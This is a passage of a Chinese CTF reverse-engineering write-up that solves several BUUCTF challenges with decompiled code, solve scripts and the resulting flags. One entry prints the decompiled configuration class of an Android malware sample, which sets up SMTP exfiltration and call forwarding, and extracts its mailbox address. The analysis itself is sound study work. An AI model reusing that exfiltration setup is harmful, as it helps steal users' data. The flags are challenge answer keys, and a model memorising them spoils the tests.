进入等待状态，前者执行一次循环后释放使用权，与此同时后者等待结束、获得使用权，进入循环，循环完后释放使用权，前者又获得使用权，如此循环往复。也就是说，两个线程的操作是交替进行的。 故实现的功能是奇数位加密，偶数位不变 还是喜欢直接爆 table = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm\\0\" cmp_code = \"TOiZiZtOrYaToUwPnToBsOaOapsyS\\0\" inp = \"\" for i in range(0,29): if(i % 2 == 0): inp += cmp_code[i] else: for j in range(0,127): if ( (j \u003c ord('a') or j \u003e ord('z')) and (j \u003c ord('A') or j \u003e ord('Z')) ): continue if ( j \u003c 97 or j \u003e 122 ): if(cmp_code[i] == table[j - 38]): inp += chr(j) else: if(cmp_code[i] == table[j - 96]): inp += chr(j) print(inp) #output：ThisisthreadofwindowshahaIsES 爆破中间又发现了个算法的小问题，按这样加密table中的第一位永远也用不到，且必须最后加个\\0才能防止数组下标越界，可能是出题人的疏忽，还是故意？ 最后还有个小坑，输入应该为30位，但程序验证的即我们所能解出的只有29位，应为多解，但出题人以及buu平台上默认最后一位是E才能correct 总结一下，这道题集合了upx脱壳，反调试（但可以像我一样只静态分析），多线程这么多知识点，可以说十分优秀了，也让我学到了很多 ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:10:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[WUSTCTF2020]level2 没啥说的，纯新手题，upx脱个壳，ida打开汇编main函数就能看到flag{Just_upx_-d} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:11:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"相册 安卓逆向，就对着jeb使劲翻吧 有一个C2类比较有用 package cn.baidujiayuan.ver5304; import android.content.Context; import com.net.cn.NativeMethod; import it.sauronsoftware.base64.Base64; import java.text.ParsePosition; import java.text.SimpleDateFormat; import java.util.Date; public class C2 { public static final String CANCELNUMBER = \"%23%2321%23\"; public static final String MAILFROME = null; public static final String MAILHOST = \"smtp.163.com\"; public static final String MAILPASS = null; public static final String MAILSERVER = null; public static final String MAILUSER = null; public static final String MOVENUMBER = \"**21*121%23\"; public static final String PORT = \"25\"; public static final String date = \"2115-11-1\"; public static final String phoneNumber; static { System.loadLibrary(\"core\"); C2.MAILSERVER = Base64.decode(NativeMethod.m()); C2.MAILUSER = Base64.decode(NativeMethod.m()); C2.MAILPASS = Base64.decode(NativeMethod.pwd()); C2.MAILFROME = Base64.decode(NativeMethod.m()); C2.phoneNumber = Base64.decode(NativeMethod.p()); } public C2() { super(); } public static boolean isFilter(Context arg6) { boolean v2 = C2.strToDateLong(\"2115-11-1\").getTime() - new Date().getTime() \u003c 0 ? true : false; return v2; } public static boolean isServerFilter(Context arg5) { boolean v2 = false; if(arg5.getSharedPreferences(\"X\", 0).getString(\"m\", \"1\").equals(\"1\")) { v2 = true; } return v2; } public static Date strToDateLong(String arg4) { return new SimpleDateFormat(\"yyyy-MM-dd\").parse(arg4, new ParsePosition(0)); } } 可以看到像MAILUSER``MAILPASS这样的变量很像是我们所要的邮箱 但还是对java/jeb不熟悉，单知道JNI却不知道NativeMethod，还以为是什么内置函数，找半天也找不到，后面查到有关java中的native才懂原来和JNI基本是一个东西 于是解压apk，在lib文件夹中找到so文件，拖进ida，找export，看到了Java_com_net_cn_NativeMethod_m，跟进去就能看到base64编码的字符串MTgyMTg0NjUxMjVAMTYzLmNvbQ== base64decode得邮箱18218465125@163.com ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:12:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[MRCTF2020]Xor 异或拿flag ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:13:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[HDCTF2019]Maze upx脱壳，进ida 有个花指令，稍微修一下，就能F5了，main函数 int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [esp+10h] [ebp-14h] char v5[16]; // [esp+14h] [ebp-10h] BYREF printf(\"Go through the maze to get the flag!\\n\"); scanf(\"%14s\", v5); for ( i = 0; i \u003c= 13; ++i ) { switch ( v5[i] ) { case 'a': --dword_408078; break; case 'd': ++dword_408078; break; case 's': --dword_40807C; break; case 'w': ++dword_40807C; break; default: continue; } } if ( dword_408078 == 5 \u0026\u0026 dword_40807C == -4 ) { printf(\"Congratulations!\\n\"); printf(\"Here is the flag:flag{%s}\\n\", v5); } else { printf(\"Try again...\\n\"); } return 0; } string窗口翻翻就能找到地图，总共70个字符，试了试应该是10*7 '*', '*', '*', '*', '*', '*', '*', '+', '*', '*' '*', '*', '*', '*', '*', '*', '*', ' ', '*', '*' '*', '*', '*', '*', ' ', ' ', ' ', ' ', '*', '*' '*', '*', ' ', ' ', ' ', '*', '*', '*', '*', '*' '*', '*', ' ', '*', '*', 'F', '*', '*', '*', '*' '*', '*', ' ', ' ', ' ', ' ', '*', '*', '*', '*' '*', '*', '*', '*', '*', '*', '*', '*', '*', '*' 手动走一下ssaaasaassdddw，即flag{ssaaasaassdddw} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:14:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[GWCTF 2019]xxor main函数 // local variable allocation has failed, the output may be wrong! __int64 __fastcall main(int a1, char **a2, char **a3) { int i; // [rsp+8h] [rbp-68h] int j; // [rsp+Ch] [rbp-64h] int v6[6]; // [rsp+10h] [rbp-60h] OVERLAPPED BYREF __int128 v7; // [rsp+28h] [rbp-48h] int v8[6]; // [rsp+40h] [rbp-30h] OVERLAPPED BYREF __int128 v9; // [rsp+58h] [rbp-18h] unsigned __int64 v10; // [rsp+68h] [rbp-8h] v10 = __readfsqword(0x28u); puts(\"Let us play a game?\"); puts(\"you have six chances to input\"); puts(\"Come on!\"); *(_OWORD *)v6 = 0uLL; *(_QWORD *)\u0026v6[4] = 0LL; v7 = 0uLL; for ( i = 0; i \u003c= 5; ++i ) { printf(\"%s\", \"input: \"); __isoc99_scanf(\"%d\", \u0026v6[i]); } *(_OWORD *)v8 = 0uLL; *(_QWORD *)\u0026v8[4] = 0LL; v9 = 0uLL; for ( j = 0; j \u003c= 4; j += 2 ) { lowInt = v6[j]; highInt = v6[j + 1]; teaCrypt(\u0026lowInt, \u0026dword_601060); v8[j] = lowInt; v8[j + 1] = highInt; } if ( (unsigned int)sub_400770(v8) != 1 ) { puts(\"NO NO NO~ \"); exit(0); } puts(\"Congratulation!\\n\"); puts(\"You seccess half\\n\"); puts(\"Do not forget to change input to hex and combine~\\n\"); puts(\"ByeBye\"); return 0LL; } 输入六串数字，先进行tea加密，然后进sub_400770要解一个小方程组 __int64 __fastcall teaCrypt(unsigned int *a1, _DWORD *a2) { __int64 result; // rax unsigned int v3; // [rsp+1Ch] [rbp-24h] unsigned int v4; // [rsp+20h] [rbp-20h] int v5; // [rsp+24h] [rbp-1Ch] unsigned int i; // [rsp+28h] [rbp-18h] v3 = *a1; v4 = a1[1]; v5 = 0; for ( i = 0; i \u003c= 0x3F; ++i ) { v5 += 1166789954; v3 += (v4 + v5 + 11) ^ ((v4 \u003c\u003c 6) + *a2) ^ ((v4 \u003e\u003e 9) + a2[1]) ^ 0x20; v4 += (v3 + v5 + 20) ^ ((v3 \u003c\u003c 6) + a2[2]) ^ ((v3 \u003e\u003e 9) + a2[3]) ^ 0x10; } *a1 = v3; result = v4; a1[1] = v4; return result; } __int64 __fastcall sub_400770(int *a1) { __int64 result; // rax if ( a1[2] - a1[3] == 2225223423LL \u0026\u0026 a1[3] + a1[4] == 4201428739LL \u0026\u0026 a1[2] - a1[4] == 1121399208LL \u0026\u0026 *a1 == -548868226 \u0026\u0026 a1[5] == -2064448480 \u0026\u0026 a1[1] == 550153460 ) { puts(\"good!\"); result = 1LL; } else { puts(\"Wrong!\"); result = 0LL; } return result; } 逆过来先z3解方程 from z3 import * s = z3.Solver() a2 = Int(\"a1[2]\") a3 = Int(\"a1[3]\") a4 = Int(\"a1[4]\") s.add(a2 - a3 == 0x84A236FF) s.add(a3 + a4 == 0xFA6CB703) s.add(a2 - a4 == 0x42D731A8) s.check() print(s.model()) # \u0026\u0026 *a1 == -548868226 # \u0026\u0026 a1[5] == -2064448480 # \u0026\u0026 a1[1] == 550153460 # output：[a1[2] = 3774025685, a1[3] = 1548802262, a1[4] = 2652626477] 然后tea解密 #include\u003cstdio.h\u003e int main(){ unsigned int a1[6] = {0xDF48EF7E, 0x20CAACF4, 3774025685, 1548802262, 2652626477, 0x84F30420}; int key[] = {2, 2, 3, 4}; for(int i = 0 ;i \u003c= 2; i++){ unsigned int lowbytes = a1[2 * i]; unsigned int highbytes = a1[2 * i + 1]; for(int j = 0x3f; j \u003e= 0; j--){ int delta = 1166789954 * (j + 1); highbytes -= (lowbytes + delta + 20) ^ ((lowbytes \u003c\u003c 6) + key[2]) ^ ((lowbytes \u003e\u003e 9) + key[3]) ^ 0x10; lowbytes -= (highbytes + delta + 11) ^ ((highbytes \u003c\u003c 6) + key[0]) ^ ((highbytes \u003e\u003e 9) + key[1]) ^ 0x20; } a1[2 * i] = lowbytes; a1[2 * i + 1] = highbytes; } for(int i = 0; i \u003c= 5; i++){ printf(\"%x\", a1[i]); } return 0; } //output：666c61677b72655f69735f6772656174217d⏎ long_to_bytes一下拿flag{re_is_great!} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:15:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[MRCTF2020]hello_world_go main函数 void __cdecl main_main() { int v0; // edi __int64 v1; // rsi __int64 v2; // r8 __int64 v3; // r9 __int64 v4; // r8 __int64 v5; // r9 int v6; // edx __int64 v7; // r8 __int64 v8; // r9 __int64 v9; // rcx __int64 v10; // rax int v11; // edx __int64 v12; // rax __int64 *v13; // [rsp+8h] [rbp-A8h] char v14; // [rsp+18h] [rbp-98h] __int64 v15; // [rsp+20h] [rbp-90h] __int64 v16; // [rsp+28h] [rbp-88h] __int64 v17; // [rsp+58h] [rbp-58h] __int64 *v18; // [rsp+60h] [rbp-50h] __int128 v19; // [rsp+68h] [rbp-48h] BYREF void *v20; // [rsp+78h] [rbp-38h] BYREF void **v21; // [rsp+80h] [rbp-30h] BYREF __int128 v22; // [rsp+88h] [rbp-28h] BYREF __int128 v23; // [rsp+98h] [rbp-18h] BYREF if ( (unsigned __int64)\u0026v21 \u003c= *(_QWORD *)(__readfsqword(0xFFFFFFF8) + 16) ) runtime_morestack_noctxt(); runtime_newobject(v0, v1); v18 = v13; *(_QWORD *)\u0026v23 = \u0026unk_4AC9C0; *((_QWORD *)\u0026v23 + 1) = \u0026off_4EA530; fmt_Fprint( v0, v1, (unsigned int)\u0026v23, (unsigned int)\u0026unk_4AC9C0, v2, v3, (__int64)\u0026go_itab__os_File_io_Writer, os_Stdout, (__int64)\u0026v23); *(_QWORD *)\u0026v22 = \u0026unk_4A96A0; *((_QWORD *)\u0026v22 + 1) = v18; fmt_Fscanf( v0, v1, (unsigned int)\u0026go_itab__os_File_io_Reader, (unsigned int)\u0026v22, v4, v5, (__int64)\u0026go_itab__os_File_io_Reader, os_Stdin, (__int64)\u0026unk_4D07C9, 2LL, (__int64)\u0026v22, 1LL); v9 = v18[1]; v10 = *v18; if ( v9 != 24 ) goto LABEL_3; v17 = *v18; runtime_memequal(v0, v1, v6, (unsigned int)aFlagHelloWorld, v7, v8, (__int64)aFlagHelloWorld, v10); if ( !v14 ) { LOBYTE(v10) = v17; LODWORD(v9) = 24; LABEL_3: runtime_cmpstring(v0, v1, (unsigned int)aFlagHelloWorld, v9, v7, v8, (__int64)aFlagHelloWorld, 24LL, v10); if ( v15 \u003e= 0 ) v12 = 1LL; else v12 = -1LL; goto LABEL_5; } v12 = 0LL; LABEL_5: if ( v12 ) { *(_QWORD *)\u0026v19 = \u0026unk_4AC9C0; *((_QWORD *)\u0026v19 + 1) = \u0026off_4EA550; fmt_Fprintln( v0, v1, v11, (unsigned int)\u0026go_itab__os_File_io_Writer, v7, v8, (__int64)\u0026go_itab__os_File_io_Writer, os_Stdout, (__int64)\u0026v19, 1LL, 1LL, v16); } else { v20 = \u0026unk_4AC9C0; v21 = \u0026off_4EA540; fmt_Fprintln( v0, v1, v11, (unsigned int)\u0026go_itab__os_File_io_Writer, v7, v8, (__int64)\u0026go_itab__os_File_io_Writer, os_Stdout, (__int64)\u0026v20, 1LL, 1LL, v16); } } 翻aFlagHelloWorld就能看到flag{hello_world_gogogo} 这道题最有用的是让我装了idaGolangHelper ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:16:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[WUSTCTF2020]level3 main函数 int __cdecl main(int argc, const char **argv, const char **envp) { char *v3; // rax char v5; // [rsp+Fh] [rbp-41h] char v6[56]; // [rsp+10h] [rbp-40h] BYREF unsigned __int64 v7; // [rsp+48h] [rbp-8h] v7 = __readfsqword(0x28u); printf(\"Try my base64 program?.....\\n\u003e\"); __isoc99_scanf(\"%20s\", v6); v5 = time(0LL); srand(v5); if ( (rand() \u0026 1) != 0 ) { v3 = base64_encode(v6); puts(v3); puts(\"Is there something wrong?\"); } else { puts(\"Sorry I think it's not prepared yet....\"); puts(\"And I get a strange string from my program which is different from the standard base64:\"); puts(\"d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==\"); puts(\"What's wrong??\"); } return 0; } 可以看出最终flag是这段字符串d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==base64解密得到的 但标准base64解密出来是乱码，说明对base64做了手脚、 其实是在start函数中藏了一个换表的操作 __int64 O_OLookAtYou() { __int64 result; // rax char v1; // [rsp+1h] [rbp-5h] int i; // [rsp+2h] [rbp-4h] for ( i = 0; i \u003c= 9; ++i ) { v1 = base64_table[i]; base64_table[i] = base64_table[19 - i]; result = 19 - i; base64_table[result] = v1; } return result; } 可以计算拿到新表，但更好的方法是直接动调就能拿到新表 写脚本拿flag import base64 new_table = \"TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" standard_table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" enc = \"d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==\" table = str.maketrans(standard_table, new_table) print(base64.b64decode(enc.translate(table))) #output：b'wctf2020{Base64_is_the_start_of_reverse}' ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:17:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[FlareOn4]IgniteMe main函数 void __thiscall __noreturn start(char *Format) { DWORD NumberOfBytesWritten; // [esp+0h] [ebp-4h] BYREF NumberOfBytesWritten = 0; hFile = GetStdHandle(0xFFFFFFF6); dword_403074 = GetStdHandle(0xFFFFFFF5); WriteFile(dword_403074, aG1v3M3T3hFl4g, 0x13u, \u0026NumberOfBytesWritten, 0); Scanf((const char *const)NumberOfBytesWritten); if ( check() ) WriteFile(dword_403074, aG00dJ0b, 0xAu, \u0026NumberOfBytesWritten, 0); else WriteFile(dword_403074, aN0tT00H0tRWe7r, 0x24u, \u0026NumberOfBytesWritten, 0); ExitProcess(0); } 主要内容在check函数 int sub_401050() { int v1; // [esp+0h] [ebp-Ch] int i; // [esp+4h] [ebp-8h] unsigned int j; // [esp+4h] [ebp-8h] char v4; // [esp+Bh] [ebp-1h] v1 = strlen((int)input); v4 = key(); for ( i = v1 - 1; i \u003e= 0; --i ) { byte_403180[i] = v4 ^ input[i]; v4 = input[i]; } for ( j = 0; j \u003c 0x27; ++j ) { if ( byte_403180[j] != (unsigned __int8)enc[j] ) return 0; } return 1; } 异或拿flag enc = [0x0D, 0x26, 0x49, 0x45, 0x2A, 0x17, 0x78, 0x44, 0x2B, 0x6C, 0x5D, 0x5E, 0x45, 0x12, 0x2F, 0x17, 0x2B, 0x44, 0x6F, 0x6E, 0x56, 0x09, 0x5F, 0x45, 0x47, 0x73, 0x26, 0x0A, 0x0D, 0x13, 0x17, 0x48, 0x42, 0x01, 0x40, 0x4D, 0x0C, 0x02, 0x69, 0x00] key = 4 flag = [0] * 40 for i in range(38, -1, -1): flag[i] = enc[i] ^ key key = flag[i] for i in flag: print(chr(i), end = \"\") #output:R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:18:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[FlareOn6]Overlong 由题目结合数组猜测数据没有打印完全 把代码dump下来，循环次数加大，运行即可拿flag #include\u003cstdio.h\u003e int cal(char *c, char *byte){ int v3; char v4; if ( (int)(unsigned char)*byte \u003e\u003e 3 == 30 ){ v4 = byte[3] \u0026 0x3F | ((byte[2] \u0026 0x3F) \u003c\u003c 6); v3 = 4; } else if ( (int)(unsigned char)*byte \u003e\u003e 4 == 14 ){ v4 = byte[2] \u0026 0x3F | ((byte[1] \u0026 0x3F) \u003c\u003c 6); v3 = 3; } else if ( (int)(unsigned char)*byte \u003e\u003e 5 == 6 ){ v4 = byte[1] \u0026 0x3F | ((*byte \u0026 0x1F) \u003c\u003c 6); v3 = 2; } else{ v4 = *byte; v3 = 1; } *c = v4; return v3; } int main(){ unsigned char bytecode[176] = { 0xE0, 0x81, 0x89, 0xC0, 0xA0, 0xC1, 0xAE, 0xE0, 0x81, 0xA5, 0xC1, 0xB6, 0xF0, 0x80, 0x81, 0xA5, 0xE0, 0x81, 0xB2, 0xF0, 0x80, 0x80, 0xA0, 0xE0, 0x81, 0xA2, 0x72, 0x6F, 0xC1, 0xAB, 0x65, 0xE0, 0x80, 0xA0, 0xE0, 0x81, 0xB4, 0xE0, 0x81, 0xA8, 0xC1, 0xA5, 0x20, 0xC1, 0xA5, 0xE0, 0x81, 0xAE, 0x63, 0xC1, 0xAF, 0xE0, 0x81, 0xA4, 0xF0, 0x80, 0x81, 0xA9, 0x6E, 0xC1, 0xA7, 0xC0, 0xBA, 0x20, 0x49, 0xF0, 0x80, 0x81, 0x9F, 0xC1, 0xA1, 0xC1, 0x9F, 0xC1, 0x8D, 0xE0, 0x81, 0x9F, 0xC1, 0xB4, 0xF0, 0x80, 0x81, 0x9F, 0xF0, 0x80, 0x81, 0xA8, 0xC1, 0x9F, 0xF0, 0x80, 0x81, 0xA5, 0xE0, 0x81, 0x9F, 0xC1, 0xA5, 0xE0, 0x81, 0x9F, 0xF0, 0x80, 0x81, 0xAE, 0xC1, 0x9F, 0xF0, 0x80, 0x81, 0x83, 0xC1, 0x9F, 0xE0, 0x81, 0xAF, 0xE0, 0x81, 0x9F, 0xC1, 0x84, 0x5F, 0xE0, 0x81, 0xA9, 0xF0, 0x80, 0x81, 0x9F, 0x6E, 0xE0, 0x81, 0x9F, 0xE0, 0x81, 0xA7, 0xE0, 0x81, 0x80, 0xF0, 0x80, 0x81, 0xA6, 0xF0, 0x80, 0x81, 0xAC, 0xE0, 0x81, 0xA1, 0xC1, 0xB2, 0xC1, 0xA5, 0xF0, 0x80, 0x80, 0xAD, 0xF0, 0x80, 0x81, 0xAF, 0x6E, 0xC0, 0xAE, 0xF0, 0x80, 0x81, 0xA3, 0x6F, 0xF0, 0x80, 0x81, 0xAD, 0x00 }; char *byte = bytecode; char c; char flag[100]; for(int i = 0; i \u003c= 100; i++){ byte += cal(\u0026c, byte); putchar(c); } } //output：I never broke the encoding: I_a_M_t_h_e_e_n_C_o_D_i_n_g@flare-on.com ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:19:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[FlareOn3]Challenge1 main函数 int __cdecl main(int argc, const char **argv, const char **envp) { unsigned __int8 Buffer[128]; // [esp+0h] [ebp-94h] BYREF char *Str1; // [esp+80h] [ebp-14h] char *Str2; // [esp+84h] [ebp-10h] HANDLE v7; // [esp+88h] [ebp-Ch] HANDLE hFile; // [esp+8Ch] [ebp-8h] DWORD NumberOfBytesWritten; // [esp+90h] [ebp-4h] BYREF hFile = GetStdHandle(0xFFFFFFF5); v7 = GetStdHandle(0xFFFFFFF6); Str2 = \"x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q\"; WriteFile(hFile, \"Enter password:\\r\\n\", 0x12u, \u0026NumberOfBytesWritten, 0); ReadFile(v7, Buffer, 0x80u, \u0026NumberOfBytesWritten, 0); Str1 = sub_401260(Buffer, NumberOfBytesWritten - 2); if ( !strcmp(Str1, Str2) ) WriteFile(hFile, \"Correct!\\r\\n\", 0xBu, \u0026NumberOfBytesWritten, 0); else WriteFile(hFile, \"Wrong password\\r\\n\", 0x11u, \u0026NumberOfBytesWritten, 0); return 0; } sub_401260函数 char *__cdecl sub_401260(unsigned __int8 *input, unsigned int cnt) { int v3; // [esp+Ch] [ebp-24h] int v4; // [esp+10h] [ebp-20h] int v5; // [esp+14h] [ebp-1Ch] int i; // [esp+1Ch] [ebp-14h] unsigned int v7; // [esp+20h] [ebp-10h] char *v8; // [esp+24h] [ebp-Ch] int v9; // [esp+28h] [ebp-8h] int v10; // [esp+28h] [ebp-8h] unsigned int v11; // [esp+2Ch] [ebp-4h] v8 = (char *)malloc(4 * ((cnt + 2) / 3) + 1); if ( !v8 ) return 0; v11 = 0; v9 = 0; while ( v11 \u003c cnt ) { v5 = input[v11]; if ( ++v11 \u003e= cnt ) v4 = 0; else v4 = input[v11++]; if ( v11 \u003e= cnt ) v3 = 0; else v3 = input[v11++]; v7 = v3 + (v5 \u003c\u003c 16) + (v4 \u003c\u003c 8); v8[v9] = aZyxabcdefghijk[(v7 \u003e\u003e 18) \u0026 0x3F]; v10 = v9 + 1; v8[v10] = aZyxabcdefghijk[(v7 \u003e\u003e 12) \u0026 0x3F]; v8[++v10] = aZyxabcdefghijk[(v7 \u003e\u003e 6) \u0026 0x3F]; v8[++v10] = aZyxabcdefghijk[v3 \u0026 0x3F]; v9 = v10 + 1; } for ( i = 0; i \u003c *(_DWORD *)\u0026aZyxabcdefghijk[4 * (cnt % 3) + 64]; ++i ) v8[4 * ((cnt + 2) / 3) - i - 1] = 61; v8[4 * ((cnt + 2) / 3)] = 0; return v8; } 看到下面的aZyxabcdefghijk就感觉有点base64换表那味，试了一下，还真是 脚本 import base64 standard_table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" new_table = \"ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/\" table = str.maketrans(new_table, standard_table) enc = \"x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q\" print(base64.b64decode(enc.translate(table))) #sh00ting_phish_in_a_barrel@flare-on.com ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:20:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[ACTF新生赛2020]Oruga 新颖的迷宫题 逻辑函数 bool __fastcall sub_78A(char *input) { int v2; // [rsp+Ch] [rbp-Ch] int v3; // [rsp+10h] [rbp-8h] int head; // [rsp+14h] [rbp-4h] v2 = 0; v3 = 5; head = 0; while ( byte_201020[v2] != '!' ) { v2 -= head; if ( input[v3] != 'W' || head == -16 ) { if ( input[v3] != 'E' || head == 1 ) { if ( input[v3] != 'M' || head == 16 ) { if ( input[v3] != 'J' || head == -1 ) return 0; head = -1; } else { head = 16; } } else { head = 1; } } else { head = -16; } ++v3; while ( !byte_201020[v2] ) { if ( head == -1 \u0026\u0026 (v2 \u0026 0xF) == 0 ) return 0; if ( head == 1 \u0026\u0026 v2 % 16 == 15 ) return 0; if ( head == 16 \u0026\u0026 (unsigned int)(v2 - 240) \u003c= 0xF ) return 0; if ( head == -16 \u0026\u0026 (unsigned int)(v2 + 15) \u003c= 0x1E ) return 0; v2 += head; } } return input[v3] == '}'; } 只要当前字符为0,就朝一个方向一直走下去，越界就寄了 手动走一下 flag：actf{MEWEMEWJMEWJM} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:21:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[Zer0pts2020]easy strcmp 出题人在main函数之前修改了strcmp函数 动调找到修改后的代码 __int64 __fastcall sub_559B072006EA(char *a1, __int64 a2) { int i; // [rsp+18h] [rbp-8h] int v4; // [rsp+18h] [rbp-8h] int j; // [rsp+1Ch] [rbp-4h] for ( i = 0; a1[i]; ++i ) ; v4 = (i \u003e\u003e 3) + 1; for ( j = 0; j \u003c v4; ++j ) *(_QWORD *)\u0026a1[8 * j] -= qword_559B07401060[j]; return off_559B07401090(a1, a2); } 其实是把input减去qword_559B07401060与zer0pts{********CENSORED********}比较 刚开始想逐位解密，但发现中间8位有问题，应该是有进位的原因 还是得强转成qword运算，但实测这么算出来最后会多一位*，删掉即可 #include\u003cstdio.h\u003e int main(){ unsigned long long key[] = {0x410A4335494A0942, 0x0B0EF2F50BE619F0, 0x4F0A3A064A35282B}; char en_flag[] = \"********CENSORED********\"; char flag[] = \"\"; for(int i = 0; i \u003c 3; i++){ *((long long *)flag + i) = *((long long *)en_flag + i) + key[i]; } puts(flag); //l3ts_m4k3_4_DETOUR_t0d4y* } flag{l3ts_m4k3_4_DETOUR_t0d4y} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:22:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[ACTF新生赛2020]Universe_final_answer main函数 __int64 __fastcall main(int a1, char **a2, char **a3) { char v4[32]; // [rsp+0h] [rbp-A8h] BYREF char input[104]; // [rsp+20h] [rbp-88h] BYREF unsigned __int64 v6; // [rsp+88h] [rbp-20h] v6 = __readfsqword(0x28u); __printf_chk(1LL, \"Please give me the key string:\", a3); scanf(\"%s\", input); if ( sub_860(input) ) { sub_C50(input, v4); __printf_chk(1LL, \"Judgement pass! flag is actf{%s_%s}\\n\", input); } else { puts(\"False key!\"); } return 0LL; } 验证函数 bool __fastcall sub_860(char *a1) { int v1; // ecx int v2; // esi int v3; // edx int v4; // er9 int v5; // er11 int v6; // ebp int v7; // ebx int v8; // er8 int v9; // er10 bool result; // al int v11; // [rsp+0h] [rbp-38h] v1 = a1[1]; v2 = *a1; v3 = a1[2]; v4 = a1[3]; v5 = a1[4]; v6 = a1[6]; v7 = a1[5]; v8 = a1[7]; v9 = a1[8]; result = 0; if ( -85 * v9 + 58 * v8 + 97 * v6 + v7 + -45 * v5 + 84 * v4 + 95 * v2 - 20 * v1 + 12 * v3 == 12613 ) { v11 = a1[9]; if ( 30 * v11 + -70 * v9 + -122 * v6 + -81 * v7 + -66 * v5 + -115 * v4 + -41 * v3 + -86 * v1 - 15 * v2 - 30 * v8 == -54400 \u0026\u0026 -103 * v11 + 120 * v8 + 108 * v7 + 48 * v4 + -89 * v3 + 78 * v1 - 41 * v2 + 31 * v5 - (v6 \u003c\u003c 6) - 120 * v9 == -10283 \u0026\u0026 71 * v6 + (v7 \u003c\u003c 7) + 99 * v5 + -111 * v3 + 85 * v1 + 79 * v2 - 30 * v4 - 119 * v8 + 48 * v9 - 16 * v11 == 22855 \u0026\u0026 5 * v11 + 23 * v9 + 122 * v8 + -19 * v6 + 99 * v7 + -117 * v5 + -69 * v3 + 22 * v1 - 98 * v2 + 10 * v4 == -2944 \u0026\u0026 -54 * v11 + -23 * v8 + -82 * v3 + -85 * v2 + 124 * v1 - 11 * v4 - 8 * v5 - 60 * v7 + 95 * v6 + 100 * v9 == -2222 \u0026\u0026 -83 * v11 + -111 * v7 + -57 * v2 + 41 * v1 + 73 * v3 - 18 * v4 + 26 * v5 + 16 * v6 + 77 * v8 - 63 * v9 == -13258 \u0026\u0026 81 * v11 + -48 * v9 + 66 * v8 + -104 * v6 + -121 * v7 + 95 * v5 + 85 * v4 + 60 * v3 + -85 * v2 + 80 * v1 == -1559 \u0026\u0026 101 * v11 + -85 * v9 + 7 * v6 + 117 * v7 + -83 * v5 + -101 * v4 + 90 * v3 + -28 * v1 + 18 * v2 - v8 == 6308 ) { result = 99 * v11 + -28 * v9 + 5 * v8 + 93 * v6 + -18 * v7 + -127 * v5 + 6 * v4 + -9 * v3 + -93 * v1 + 58 * v2 == -1697; } } return result; } 直接上z3 from z3 import * v1 = Int('v1') v2 = Int('v2') v3 = Int('v3') v4 = Int('v4') v5 = Int('v5') v6 = Int('v6') v7 = Int('v7') v8 = Int('v8') v9 = Int('v9') v10 = Int('v10') v11 = Int('v11') s = z3.Solver() s.add(-85 * v9 + 58 * v8 + 97 * v6 + v7 + -45 * v5 + 84 * v4 + 95 * v2 - 20 * v1 + 12 * v3 == 12613) s.add(30 * v11 + -70 * v9 + -122 * v6 + -81 * v7 + -66 * v5 + -115 * v4 + -41 * v3 + -86 * v1 - 15 * v2 - 30 * v8 == -54400) s.add(-103 * v11 + 120 * v8 + 108 * v7 + 48 * v4 + -89 * v3 + 78 * v1 - 41 * v2 + 31 * v5 - (v6 * 64) - 120 * v9 == 